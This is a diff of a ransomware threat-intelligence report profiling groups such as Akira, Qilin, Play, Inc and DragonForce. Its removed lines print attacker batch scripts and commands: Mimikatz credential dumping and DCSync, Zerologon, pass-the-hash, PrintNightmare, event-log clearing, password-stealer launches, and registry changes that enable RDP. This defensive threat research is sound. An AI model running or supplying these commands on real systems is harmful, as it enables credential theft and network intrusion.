@@ -17,11 +17,6 @@ An Analysis from the Symantec® and Carbon Black® Threat Hunter Team
   - [Greenbottle](#greenbottle)
   - [Syrphid](#syrphid)
 - [Ransomware TTPs](#ransomware-ttps)
-  - [Living off the Land](#living-off-the-land)
-  - [Credential Access and Theft](#credential-access-and-theft)
-  - [Impairing Defenses](#impairing-defenses)
-  - [Data Exfiltration](#data-exfiltration)
-  - [Remote Access Software](#remote-access-software)
 - [Defense and Protection: How Symantec and Carbon Black Guard against Ransomware Attacks](#defense-and-protection-how-symantec-and-carbon-black-guard-against-ransomware-attacks)
 - [Mitigation](#mitigation)
 
@@ -53,7 +48,7 @@ If these attacks are factored in, the number of extortion attacks in 2025 was 61
 
 ![Figure 5: Claimed Extortion Attacks, Including Encryptionless Extortion Attacks, 2022–2025]
 
-> NOTE: Snakefly numbers are attacks claimed on Cl0p leak site. Shiny Hunters/Scattered Lapsus Hunters numbers derive from publicly reported number of victims, most notably Salesloft Drift and Gainsight.
+_NOTE: Snakefly numbers are attacks claimed on Cl0p leak site. Shiny Hunters/Scattered Lapsus Hunters numbers derive from publicly reported number of victims, most notably Salesloft Drift and Gainsight._
 
 ## Encryptionless Extortion: The End of Ransomware?
 
@@ -124,7 +119,6 @@ The involvement of Chinese espionage actors in ransomware is a growing phenomeno
 ## Ransomware Actors
 
 ### Darter
-
 **Ransomware families:** Ransom.Akira
 **Active since:** 2023
 **Ransomware-as-a-service:** Yes
@@ -147,7 +141,7 @@ There appears to be loose links between some affiliates deploying Akira and the 
 
 A report in December 2025 said that a large jump in ransomware attacks targeting hypervisors could primarily be attributed to attackers deploying Akira. The attackers were targeting hypervisors in an attempt to circumvent endpoint and network security controls.
 
-#### Case Study: Akira Attackers Use Bumblebee Loader
+**Case Study: Akira Attackers Use Bumblebee Loader**
 
 Some attacks in mid-to-late 2025 where the Akira ransomware was deployed featured an interesting attack chain. The Windows CardSpace User Interface Agent (icardagt.exe) and the MS Media Foundation Protected Pipeline (mfpmp.exe) were both used for sideloading the Bumblebee loader.
 
@@ -156,7 +150,6 @@ The Windows CardSpace User Interface Agent was first used by Akira attackers in 
 Bumblebee is a loader that has existed since 2022, and it has been associated with multiple ransomware families. Bumblebee first appeared in 2022. It was associated with several ransomware operations including Conti, Quantum, and Mountlocker. Bumblebee might have been introduced as a replacement loader for the older Trickbot and BazarLoader loaders. There was some overlap between the Bumblebee loader’s activity and older attacks linked to those older loaders. There have been links drawn before between Akira and the now-defunct Conti operation. In these recent attacks, Bumblebee was loaded into memory by the attackers in an attempt to evade detection.
 
 ### Stinkbug
-
 **Aliases:** Qilin, Agenda, Water Galura
 **Ransomware families:** Qilin (Ransom.Qilin)
 **Active since:** 2022
@@ -174,7 +167,7 @@ It was also reported in October 2025 that Stinkbug was now working with Syrphid 
 
 The reputation of Qilin in the threat landscape was highlighted in a ransomware attack campaign in November, identified by the Threat Hunter Team. A threat actor was impersonating Qilin but was actually deploying the LockBit ransomware. The attacker evidently thought that using the Qilin name would be most effective at intimidating the victims into paying a ransom.
 
-#### Case Study: Qilin Ransomware Attack on Local Government in U.S.
+**Case Study: Qilin Ransomware Attack on Local Government in U.S.**
 
 Attackers attempted to deploy the Qilin ransomware in a February 2025 attack on a local government organization in the U.S. During that incident, the attackers used a large number of publicly available, dual-use and living-off-the-land tools. Two of the dual-use tools used to disable the security software had not been seen in use by the attackers deploying Qilin before.
 
@@ -196,155 +189,9 @@ The other previously unseen tool, YDark, is a publicly available kernel manipula
 
 The attackers in this campaign also dropped a wide variety of publicly available hacking tools and infostealers packaged in a password-protected archive to help avoid detection. An array of tools was contained in the password-protected archive, with the attackers using them operationally as needed.
 
-They also used a number of operational scripts in the form of .bat and .txt files, which had not been documented before. Some examples shown in the following sections.
-
-**!dcsync.bat (Mimikatz)**
-```
-mode con: cols=50 lines=30
-color A
-cls
-title Luciferium Mimikatz
-reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
-cd /d %~dp0
-md !logs
-md !logs\Hashes
-.\Mimik\x64\mimikatz.exe "privilege::debug" "sekurlsa::bootkey" "token::elevate" "event::clear" "log .\!logs\dcsync.txt" "lsadump::dcsync /domain: /user:Administrator /authuser:$ /authdomain: /authntlm"
-exit
-```
-
-**!light.bat (Enable RDP and Steal Credentials)**
-```
-@echo off
-mode con: cols=50 lines=30
-color A
-cls
-title Luciferium Mimikatz
-reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-cd /d %~dp0
-md !logs
-md !logs\Hashes
-md !logs\Linux
-if %PROCESSOR_ARCHITECTURE%==AMD64 (
-        start .\Pass\netpass64.exe
-) else (start .\Pass\netpass.exe)
-start .\Pass\WebBrowserPassView.exe
-.\Pass\BypassCredGuard.exe
-.\Pass\SharpDecryptPwd WinSCP >> .\!logs\Linux\WinSCP.txt
-.\Pass\SharpDecryptPwd Navicat >> .\!logs\Linux\Navicat.txt
-.\Pass\SharpDecryptPwd Xmanager >> .\!logs\Linux\Xmanager.txt
-.\Pass\SharpDecryptPwd TeamViewer >> .\!logs\Linux\TeamViewer.txt
-.\Pass\SharpDecryptPwd FileZilla >> .\!logs\Linux\FileZilla.txt
-.\Pass\SharpDecryptPwd Foxmail >> .\!logs\Linux\Foxmail.txt
-.\Pass\SharpDecryptPwd TortoiseSVN >> .\!logs\Linux\TortoiseSVN.txt
-.\Pass\SharpDecryptPwd Chrome >> .\!logs\Linux\Chrome.txt
-.\Pass\SharpDecryptPwd RDCMan >> .\!logs\Linux\RDCMan.txt
-.\Pass\SharpDecryptPwd SunLogin >> .\!logs\Linux\SunLogin.txt
-if exist "%dllPath%" (
-    .\Pass\SCOMDecrypt >> "%logPath%" 2>nul
-) else (
-    echo File "%dllPath%" not found.
-)
-if %PROCESSOR_ARCHITECTURE%==AMD64 (
-.\Mimik\x64\mimikatz.exe "event::clear" "sekurlsa::bootkey" "misc::memssp" "privilege::debug" "token::elevate" "sekurlsa::dpapi" "log .\!logs\Result.txt" "sekurlsa::logonPasswords" "vault::cred" "lsadump::secrets" "lsadump::cache" "lsadump::sam" "ts::mstsc" "ts::logonPasswords" "misc::citrix"
-exit
-) else (.\Mimik\x32\mimikatz.exe "event::clear" "sekurlsa::bootkey" "misc::memssp" "privilege::debug" "token::elevate" "sekurlsa::dpapi" "log .\!logs\Result.txt" "sekurlsa::logonPasswords" "vault::cred" "lsadump::secrets" "lsadump::cache" "lsadump::sam" "ts::mstsc" "ts::logonPasswords" "misc::citrix"
-exit)
-.\Mimik\pars.vbs .\!logs\Result.txt
-) else (.\Mimik\pars.vbs .\!logs\Result32.txt)
-```
-
-**!start.bat (Enable RDP and Steal Credentials)**
-```
-mode con: cols=50 lines=30
-color A
-cls
-title Luciferium Mimikatz
-reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-set "dllPath=C:\Program Files\Microsoft System Center 2012 R2\Operations Manager\Server\Microsoft.Mom.Sdk.SecureStorageManager.dll"
-set "logPath=.\!logs\SCOM(Pass).txt"
-cd /d %~dp0
-md !logs
-md !logs\Hashes
-if %PROCESSOR_ARCHITECTURE%==AMD64 (
-        start .\Pass\BulletsPassView64.exe
-) else (start .\Pass\BulletsPassView.exe)
-if %PROCESSOR_ARCHITECTURE%==AMD64 (
-        start .\Pass\netpass64.exe
-) else (start .\Pass\netpass.exe)
-if %PROCESSOR_ARCHITECTURE%==AMD64 (
-        start .\Pass\WirelessKeyView64.exe
-) else (start .\Pass\WirelessKeyView.exe)
-if %PROCESSOR_ARCHITECTURE%==AMD64 (
-        start .\Pass\PasswordFox64.exe
-) else (start .\Pass\PasswordFox.exe)
-start .\Pass\OperaPassView.exe
-start .\Pass\iepv.exe
-start .\Pass\ChromePass.exe
-start .\Pass\VNCPassView.exe
-start .\Pass\Dialupass.exe
-start .\Pass\mailpv.exe
-start .\Pass\mspass.exe
-start .\Pass\NetRouteView.exe
-start .\Pass\rdpv.exe
-start .\Pass\RouterPassView.exe
-start .\Pass\WebBrowserPassView.exe
-.\Pass\BypassCredGuard.exe
-.\Pass\SharpDecryptPwd WinSCP >> .\!logs\Linux\WinSCP.txt
-.\Pass\SharpDecryptPwd Navicat >> .\!logs\Linux\Navicat.txt
-.\Pass\SharpDecryptPwd Xmanager >> .\!logs\Linux\Xmanager.txt
-.\Pass\SharpDecryptPwd TeamViewer >> .\!logs\Linux\TeamViewer.txt
-.\Pass\SharpDecryptPwd FileZilla >> .\!logs\Linux\FileZilla.txt
-.\Pass\SharpDecryptPwd Foxmail >> .\!logs\Linux\Foxmail.txt
-.\Pass\SharpDecryptPwd TortoiseSVN >> .\!logs\Linux\TortoiseSVN.txt
-.\Pass\SharpDecryptPwd Chrome >> .\!logs\Linux\Chrome.txt
-.\Pass\SharpDecryptPwd RDCMan >> .\!logs\Linux\RDCMan.txt
-.\Pass\SharpDecryptPwd SunLogin >> .\!logs\Linux\SunLogin.txt
-if exist "%dllPath%" (
-    .\Pass\SCOMDecrypt >> "%logPath%" 2>nul
-) else (
-    echo File "%dllPath%" not found.
-)
-if %PROCESSOR_ARCHITECTURE%==AMD64 (
-.\Mimik\x64\mimikatz.exe "event::clear" "sekurlsa::bootkey" "misc::memssp" "privilege::debug" "token::elevate" "sekurlsa::dpapi" "log .\!logs\Result.txt" "sekurlsa::logonPasswords" "vault::cred" "lsadump::secrets" "lsadump::cache" "lsadump::sam" "ts::mstsc" "ts::logonPasswords" "misc::citrix"
-exit
-) else (.\Mimik\x32\mimikatz.exe "event::clear" "sekurlsa::bootkey" "misc::memssp" "privilege::debug" "token::elevate" "sekurlsa::dpapi" "log .\!logs\Result.txt" "sekurlsa::logonPasswords" "vault::cred" "lsadump::secrets" "lsadump::cache" "lsadump::sam" "ts::mstsc" "ts::logonPasswords" "misc::citrix"
-exit)
-.\Mimik\pars.vbs .\!logs\Result.txt
-) else (.\Mimik\pars.vbs .\!logs\Result32.txt)
-```
-
-**Command.txt (Steal Credentials)**
-```
-Zerologon
-lsadump::zerologon /target: /ntlm /null /account:$ /exploit
-Pass The Hash
-sekurlsa::pth /user:Administrator /domain: /ntlm: /run:regedit
-sekurlsa::pth /user:Administrator /domain: /ntlm: /run:"mstsc.exe /restrictedadmin"
-sekurlsa::pth /user:Administrator /domain: /ntlm: /run:powershell
-sekurlsa::pth /user:Administrator /domain: /ntlm: /run:mimikatz
-DCSync
-lsadump::dcsync /domain: /user:Administrator /authuser: /authdomain: /authpassword:"" /authntlm
-lsadump::dcsync /domain: /user:Administrator
-31d6cfe0d16ae931b73c59d7e0c089c0
-DisableRestrictedAdmin
-PrintNightMare
-misc::printnightmare /target: /authuser: /authpassword: /library:\\mypc.domain.local\share\payload.dll
-Privilege
-privilege::debug
-sekurlsa::bootkey
-token::elevate
-Skeleton
-misc::skeleton
-Multi RDP
-ts::multirdp
-```
-
-Tools contained in the archive included PCHunter to terminate security software, password-dumping tools Mimikatz and SharpDecryptPwd, DialupPass to enumerate VPN connection details, and multiple password recovery tools (for example, VNCPassTool, NetPass, ChromePass, and more).
+They also used a number of operational scripts in the form of .bat and .txt files, which had not been documented before.
 
 ### Balloonfly
-
 **Aliases:** Play, PlayCrypt
 **Ransomware families:** Ransom.Play
 **Active since:** June 2022
@@ -360,11 +207,11 @@ The FBI and CISA also said that attackers using the Play ransomware contacted so
 
 The authorities also warned that attackers were now also using an ESXi variant of Play. In April 2024, Balloonfly was linked to an attack on IxMetro Powerhost, a major web infrastructure service provider based in Chile. VMware® ESXi servers used by the company to provide virtual private servers for customers were encrypted in the attack. The attackers requested a ransom payment of two Bitcoin for each customer impacted, amounting to an estimated ransom of approximately $140 million.
 
-Balloonfly was also reported to have exploited the vulnerability in the remote monitoring and management (RMM) tool SimpleHelp (CVE-2024-57727). The goal was to target U.S.-based entities following the vulnerability’s disclosure on January 16, 2025. The Threat Hunter Team also found evidence of Balloonfly exploiting a zero-day Windows privilege escalation vulnerability (CVE-2025-29824) prior to it being patched on April 8, 2025 (see Case Study: Ransomware Attackers Leveraged Privilege Escalation Zero-Day Vulnerability). Balloonfly frequently targets victims using exploits for known vulnerabilities and has also exploited vulnerabilities in Microsoft Exchange and Fortinet FortiOS software.
+Balloonfly was also reported to have exploited the vulnerability in the remote monitoring and management (RMM) tool SimpleHelp (CVE-2024-57727). The goal was to target U.S.-based entities following the vulnerability’s disclosure on January 16, 2025. The Threat Hunter Team also found evidence of Balloonfly exploiting a zero-day Windows privilege escalation vulnerability (CVE-2025-29824) prior to it being patched on April 8, 2025. Balloonfly frequently targets victims using exploits for known vulnerabilities and has also exploited vulnerabilities in Microsoft Exchange and Fortinet FortiOS software.
 
 Balloonfly is known to develop its own custom tools for use in ransomware attacks. In April 2023, the Threat Hunter Team uncovered two new, custom-developed data gathering tools used by Balloonfly in attacks. The tools allow the threat actors to enumerate all users and computers on a compromised network and copy files from the Volume Shadow Copy Service that are normally locked by the operating system.
 
-#### Case Study: Ransomware Attackers Leveraged Privilege Escalation Zero-Day Vulnerability
+**Case Study: Ransomware Attackers Leveraged Privilege Escalation Zero-Day Vulnerability**
 
 Attackers using the Play ransomware exploited a Windows elevation of privilege vulnerability (CVE-2025-29824) in the CLFS driver (clfs.sys) as a zero-day vulnerability during an attempted attack against an organization in the U.S. The attack occurred prior to the disclosure and patching of the vulnerability on April 8, 2025.
 
@@ -383,7 +230,6 @@ The first batch file, called servtask.bat, is stored in the C:\ProgramData folde
 While no ransomware was ultimately deployed in this attack, it is still notable as the exploitation of zero-day vulnerabilitys by ransomware actors is relatively rare.
 
 ### Warble
-
 **Aliases:** Inc
 **Ransomware families:** Inc (Ransom.Inc)
 **Active since:** 2023
@@ -405,7 +251,7 @@ There were also reports in October 2024 that Inc had been rebranded as Lynx, wit
 
 In a February 2025, an Inc ransomware attack was documented by the Threat Hunter Team, multiple pre-ransomware tools were used, including NetScan for the discovery of host names and network services, and the publicly available data backup tool Restic for data exfiltration. The attackers also enabled RDP and used the SimpleHelp remote admin tool, which was already present on the targeted network, to deploy the ransomware.
 
-#### Case Study: Wasabi Favored for Data Exfiltration
+**Case Study: Wasabi Favored for Data Exfiltration**
 
 In an October 2025 incident, attackers who were deploying the Inc ransomware used the Restic data backup tool to exfiltrate large amounts of data to Wasabi buckets prior to deploying the ransomware.
 
@@ -413,12 +259,7 @@ Of note is that in at least one of the organizations where Inc attackers were on
 
 The use of Wasabi for data exfiltration is also interesting. Wasabi is a legitimate cloud storage service, and the same Wasabi account was used to exfiltrate data in two separate incidents. This appears to be a widespread campaign by the attackers with victims in multiple countries and sectors, including manufacturing, retail, professional services, and more. In the second incident reviewed by the Threat Hunter team, we did not see ransomware being deployed, but we are confident the same actor was behind the activity due to the similarities in the attack chain and the use of the same Wasabi account for data exfiltration. One possibility is that these attacks were all carried out by the same Inc ransomware affiliate.
 
-Other tools used in the attack chain included multiple remote access tools, like AnyDesk, credential dumping tool Mimikatz, Veeam, and Nirsoft password stealers. The attackers also carried out network scanning using NetScan, used scheduled tasks to maintain persistence, and RDPClip to gain remote access to the clipboard. They also used a custom post-exploitation tool that has similar capabilities to the publicly available CrackMapExec. The tool takes for input, an IP address list, domain and username, password, number of threads, and a name for the output archive. It is supposed to communicate with the attackers if a login has been successful, but it is not clear if it always works correctly.
-
-Notably, in an Osiris ransomware attack documented by the Threat Hunter Team in December 2025, the attackers used a version of Mimikatz with the same filename (kaz.exe) previously used by attackers deploying Inc. They also exfiltrated the stolen data to the legitimate Wasabi cloud storage service, like the attackers in the earlier attacks. The overlaps could mean that Warble tactics are being emulated, or that a Warble affiliate is now working with Osiris. Given the use of Wasabi in these attacks, it could be likely that the affiliate responsible for the October Inc ransomware attacks was also responsible for the November Osiris attacks.
-
 ### Hackledorb
-
 **Aliases:** DragonForce
 **Ransomware families:** DragonForce (Ransom.DragonForce)
 **Active since:** 2023
@@ -434,38 +275,11 @@ While Hackledorb initially operated as a traditional RaaS operation, in April 20
 
 At this time, Hackledorb was also reported to have been attacking rival ransomware gangs. It reportedly played a role in the downfall of the RansomHub operation before going on to work with many of its affiliates. While Hackledorb announced its rebrand, there were defacements of the leak sites for the rival BlackLock and Mamona ransomware groups. These defacements appeared to be the work of Hackledorb. Meanwhile, posts on its own leaks site and the underground forum RAMP indicated that RansomHub (also known as Greenbottle) was collaborating with Hackledorb. However, shortly after those posts appeared, RansomHub went dark. The collaboration might have been a hostile takeover by Hackledorb. Up to the point of its disappearance, RansomHub had been one of the most active ransomware families following the collapse of the LockBit and Noberus ransomware gangs.
 
-Attackers deploying DragonForce are known to use a wide variety of living-off-the-land and dual-use tools (see Case Study: Array of Open-Source Tools Deployed), while the BYOVD technique for disabling security software is also frequently seen in Hackledorb attacks. A tool called EDRKillShifter that was originally developed by Greenbottle is now also reportedly being shared by groups including DragonForce, Stinkbug, Blacksuit, Medusa, Crytox, Lynx, and Inc. EDRKillShifter is a BYOVD tool that can be used to disable security software.
+Attackers deploying DragonForce are known to use a wide variety of living-off-the-land and dual-use tools, while the BYOVD technique for disabling security software is also frequently seen in Hackledorb attacks. A tool called EDRKillShifter that was originally developed by Greenbottle is now also reportedly being shared by groups including DragonForce, Stinkbug, Blacksuit, Medusa, DragonForce, Crytox, Lynx, and Inc. EDRKillShifter is a BYOVD tool that can be used to disable security software.
 
 It was also reported in October 2025 that Hackledorb was now working with Syphid (LockBit) and Stinkbug (Qilin), although the nature of the collaboration remains unclear.
 
-In June 2025, Hackledorb was said to be one of the ransomware gangs that had been exploiting a vulnerability tracked as CVE-2024-57727 in SimpleHelp’s RMM software since January 2025. Exploiting this vulnerability could allow an unauthenticated remote attacker to download arbitrary files, including sensitive server configuration files and hashed passwords, through specially crafted HTTP requests.
-
-A September 2025 attack in which the DragonForce ransomware was deployed had overlaps in its TTPs with an August 2025 Cicada ransomware attack, indicating the same affiliate may have carried out both attacks. This may mean the affiliate moved from working with Cicada to working with Hackledorb, or they may be working with both RaaS operators at the same time.
-
-In both attacks, the same vulnerable Intel driver was side-loaded onto machines in victim networks through a legitimate executable (upd.exe). Two government-linked organizations in a South Asian country were compromised with the DragonForce ransomware, while a financial institution in the same country had been infected with Cicada in August 2025. The repeated targeting of this region, combined with overlapping TTPs, strongly suggests that both attacks were conducted by the same actor. Cicada ransomware (also known as Cicada3301) is believed to be a possible evolution of the ALPHV/BlackCat ransomware operation, and it launched as a RaaS in mid-2024.
-
-#### Case Study: Array of Open-Source Tools Deployed
-
-The DragonForce ransomware was used in a May 2025 attack targeting an organization in the financial sector. The most notable activity on the targeted network was detected on a machine with a Veeam credential recovery script, which also had the remote desktop management software Atera installed on it. Another machine on the network also had Atera installed on it, along with suspicious NetScan usage, and what appeared to be the Neshuta malware.
-
-Neshuta is an old file infector malware that has been observed in the threat landscape as early as 2005. Its main function is to prepend virus code to executable files and collect basic system information. The malware also has functionality to establish persistence on infected endpoints and has been used as a dropper for other malware. A spike in its activity was reported in August 2024. Two attempts were made to disable anti-virus software deployed on machines on this network.
-
-The first activity seen on the network appeared to be Netscan, followed by credential dumping through Ntdsutil. Rclone, an open-source tool known to be commonly used by ransomware actors to exfiltrate data, was then seen, and multiple connections to the MegaSync cloud.
-
-There then appeared to be a lag in activity for a little over a week, with the attackers seemingly returning to the network when commands were executed to enable RDP access through PsExec:
-
-```
-"sc" start TermService
-"sc" config TermService start= auto
-"reg" add HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
-```
-
-Then there was a command to kill security software.
-
-The DragonForce ransomware was then deployed on the victim network, along with a ransom note. Files that were encrypted were given a .dragonforce_encrypted extension.
-
 ### Greenbottle
-
 **Aliases:** RansomHub, CyCl0ps
 **Ransomware families:** RansomHub (Ransom.Ransomhub)
 **Active since:** 2024
@@ -477,7 +291,7 @@ Initial analysis by the Threat Hunter Team found that the payload was a developm
 
 In March 2025, the Threat Hunter Team reported that at least one affiliate of the RansomHub RaaS was using a new custom backdoor called Backdoor.Betruger in attacks. This backdoor was a rare example of a multi-function backdoor, seemingly developed specifically for use in carrying out ransomware attacks.
 
-The Betruger backdoor contained functionality that is usually found in multiple pre-ransomware tools, including: screen capture, key logging, file upload to a C&C server, network scanning, privilege escalation, a...
+The Betruger backdoor contained functionality that is usually found in multiple pre-ransomware tools, including: screen capture, key logging, file upload to a C&C server, network scanning, privilege escalation, and more.
 
 ---
 
